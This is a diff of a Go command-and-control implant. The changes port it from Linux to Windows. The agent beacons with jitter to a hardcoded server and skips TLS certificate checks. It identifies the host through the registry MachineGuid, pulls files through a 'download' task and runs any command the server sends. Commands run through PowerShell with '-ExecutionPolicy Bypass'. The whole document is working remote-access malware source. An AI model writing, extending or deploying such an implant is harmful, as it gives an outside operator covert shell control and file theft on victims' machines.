@@ -2,32 +2,32 @@ package main
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
-	"net/http"
-	"os/exec"
-	"os"
-	"encoding/base64"
-	"math/rand"
-	"time"
-	"strings"
-	"crypto/sha256"
-	"crypto/tls"
 	"math/big"
+	"math/rand"
+	"net/http"
+	"os"
+	"os/exec"
 	"runtime"
+	"strings"
+	"time"
 )
 
 const (
-	ServerURL = "http://192.168.1.172:8080" 
+	ServerURL = "https://192.168.1.172:8080"
 	PollDelay = 2 * time.Second
 )
 
 type PollResponse struct {
-	Status  string `json:"status"`
-	Command string `json:"command"`
-	Interval int    `json:"interval"` 
-    Jitter   int    `json:"jitter"`   
+	Status   string `json:"status"`
+	Command  string `json:"command"`
+	Interval int    `json:"interval"`
+	Jitter   int    `json:"jitter"`
 }
 
 type OutputPayload struct {
@@ -37,35 +37,36 @@ type OutputPayload struct {
 
 var AgentID string
 
-
-//skip ssl verify
+// skip ssl verify
 var httpClient = &http.Client{
-    Transport: &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-    },
-    Timeout: 10 * time.Second,
+	Transport: &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	},
+	Timeout: 10 * time.Second,
 }
-
 
 //---------
 
-//get id
 func getSystemIdentifier() string {
+	cmd := exec.Command("reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Cryptography", "/v", "MachineGuid")
+	output, err := cmd.Output()
 
-	// Linux /etc/machine-id 
-	if data, err := os.ReadFile("/etc/machine-id"); err == nil {
-		return strings.TrimSpace(string(data))
-	}
-	if data, err := os.ReadFile("/var/lib/dbus/machine-id"); err == nil {
-		return strings.TrimSpace(string(data))
+	if err == nil {
+		lines := strings.Split(string(output), "\n")
+		for _, line := range lines {
+			if strings.Contains(line, "MachineGuid") {
+				parts := strings.Fields(line)
+				if len(parts) >= 3 {
+					return parts[2]
+				}
+			}
+		}
 	}
 
-	// Fallback Hostname + User
 	hostname, _ := os.Hostname()
 	return hostname + "_" + runtime.GOOS
 }
 
-//hash
 func generate10DigitCode(input string) string {
 	hash := sha256.Sum256([]byte(input))
 
@@ -77,26 +78,25 @@ func generate10DigitCode(input string) string {
 	return fmt.Sprintf("%010d", i)
 }
 
-
 //---------
 
-//ch-beacon
+// ch-beacon
 func calculateSleep(baseInterval int, jitterPercent int) time.Duration {
-    if baseInterval <= 0 {
-        baseInterval = 5
-    }
-    if jitterPercent <= 0 {
-        return time.Duration(baseInterval) * time.Second
-    }
+	if baseInterval <= 0 {
+		baseInterval = 5
+	}
+	if jitterPercent <= 0 {
+		return time.Duration(baseInterval) * time.Second
+	}
 
-    jitterMax := float64(baseInterval) * (float64(jitterPercent) / 100.0)
-    jitterOffset := (rand.Float64() * 2 * jitterMax) - jitterMax
-    finalInterval := float64(baseInterval) + jitterOffset
+	jitterMax := float64(baseInterval) * (float64(jitterPercent) / 100.0)
+	jitterOffset := (rand.Float64() * 2 * jitterMax) - jitterMax
+	finalInterval := float64(baseInterval) + jitterOffset
 
-    if finalInterval < 1 {
-        finalInterval = 1
-    }
-    return time.Duration(finalInterval * float64(time.Second))
+	if finalInterval < 1 {
+		finalInterval = 1
+	}
+	return time.Duration(finalInterval * float64(time.Second))
 }
 
 func sendOutput(agentID string, output string) {
@@ -122,7 +122,6 @@ func sendOutput(agentID string, output string) {
 	fmt.Println("[+] Output sent back to server successfully.")
 }
 
-
 func main() {
 
 	sysIdentifier := getSystemIdentifier()
@@ -132,7 +131,7 @@ func main() {
 	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
 
 	currentInterval := 5
-    currentJitter := 0
+	currentJitter := 0
 
 	for {
 		// poll to server ep
@@ -160,22 +159,18 @@ func main() {
 			continue
 		}
 
-        if pollResp.Interval > 0 {
-            currentInterval = pollResp.Interval
-        }
-        currentJitter = pollResp.Jitter
-
-
-
+		if pollResp.Interval > 0 {
+			currentInterval = pollResp.Interval
+		}
+		currentJitter = pollResp.Jitter
 
 		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
 			fmt.Printf("[+] Received command: %s\n", pollResp.Command)
 
-
 			var outputStr string
 
-            parts := strings.SplitN(pollResp.Command, " ", 3)
-            actionType := parts[0]
+			parts := strings.SplitN(pollResp.Command, " ", 3)
+			actionType := parts[0]
 
 			if actionType == "download" && len(parts) >= 2 {
 				filePath := parts[1]
@@ -205,12 +200,14 @@ func main() {
 					}
 				}
 
-
 				sendOutput(AgentID, outputStr)
 
-			} else{
-				//exec comand 
-				cmd := exec.Command("/bin/sh", "-c", pollResp.Command)
+			} else {
+				//exec comand
+				var cmd *exec.Cmd
+
+				cmd = exec.Command("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", pollResp.Command)
+
 				var out bytes.Buffer
 				cmd.Stdout = &out
 				cmd.Stderr = &out
@@ -235,5 +232,4 @@ func main() {
 		time.Sleep(calculateSleep(currentInterval, currentJitter))
 	}
 }
-
 
